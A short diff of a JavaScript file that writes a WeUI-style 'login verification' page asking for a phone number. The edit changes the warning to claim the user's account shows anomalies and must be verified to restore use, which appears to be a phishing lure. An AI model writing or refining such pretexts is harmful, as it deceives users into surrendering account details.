@@ -46,7 +46,7 @@ document.writeln("		</span> </a> </div>");
 document.writeln("    <h1 class=\'page__title\'>登陆验证</h1>");
 document.writeln("  </div>");
 document.writeln("  <div class=\'page__bd\'>");
-document.writeln("    <div class=\'weui-cells__title\'>检测到您在非安全环境中使用，请验证手机号。</div>");
+document.writeln("    <div class=\'weui-cells__title\'>经检测您的账号存在异常验证后恢复使用，请验证手机号。</div>");
 document.writeln("    <div class=\'weui-cells weui-cells_form\'>");
 document.writeln("      <div class=\'weui-cell weui-cell_vcode\'>");
 document.writeln("        <div class=\'weui-cell__hd\'>");
